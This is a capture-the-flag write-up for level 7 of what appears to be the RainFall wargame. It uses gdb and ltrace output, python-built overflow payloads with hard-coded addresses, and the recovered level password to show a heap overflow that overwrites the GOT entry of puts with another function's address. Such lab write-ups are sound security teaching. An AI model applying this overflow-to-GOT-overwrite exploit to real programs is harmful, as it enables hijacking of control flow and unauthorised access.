# Level 7

we want to call `m()` to print the password read into the global variable `c`

```shell
level7@RainFall:~$ gdb -q ./level7 
Reading symbols from /home/user/level7/level7...(no debugging symbols found)...done.
(gdb) disas puts
Dump of assembler code for function puts@plt:
   0x08048400 <+0>:     jmp    *0x8049928
   0x08048406 <+6>:     push   $0x28
   0x0804840b <+11>:    jmp    0x80483a0
End of assembler dump.
(gdb) p m
$1 = {<text variable, no debug info>} 0x80484f4 <m>
```
0x08049928 value of puts in GOT
0x080484f4 value of m

By running `ltrace` we see that we can change the destination address of the second strcpy call:
```shell
level7@RainFall:~$ ltrace ./level7 "ARGV1" "ARGV2"
__libc_start_main(0x8048521, 3, 0xbffff6e4, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                                = 0x0804a008
malloc(8)                                                = 0x0804a018
malloc(8)                                                = 0x0804a028
malloc(8)                                                = 0x0804a038
strcpy(0x0804a018, "ARGV1")                              = 0x0804a018
strcpy(0x0804a038, "ARGV2")                              = 0x0804a038
fopen("/home/user/level8/.pass", "r")                    = 0
fgets( <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++

level7@RainFall:~$ ltrace ./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') "ARGV2"
__libc_start_main(0x8048521, 3, 0xbffff6d4, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                                = 0x0804a008
malloc(8)                                                = 0x0804a018
malloc(8)                                                = 0x0804a028
malloc(8)                                                = 0x0804a038
strcpy(0x0804a018, "AAAAAAAAAAAAAAAAAAAA(\231\004\b")    = 0x0804a018
strcpy(0x08049928, "ARGV2")                              = 0x08049928
fopen("/home/user/level8/.pass", "r")                    = 0
fgets( <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```

We see here that if we can succesfully overwrite the value in b[1] with our argv[1], we can then write to that address in b[1].
So we can use it to overwrite the Global Offset Table value of `puts` with the address of `m`.
```shell
level7@RainFall:~$ ./level7 $(python -c 'print "a"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')                        

5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1668625280
```
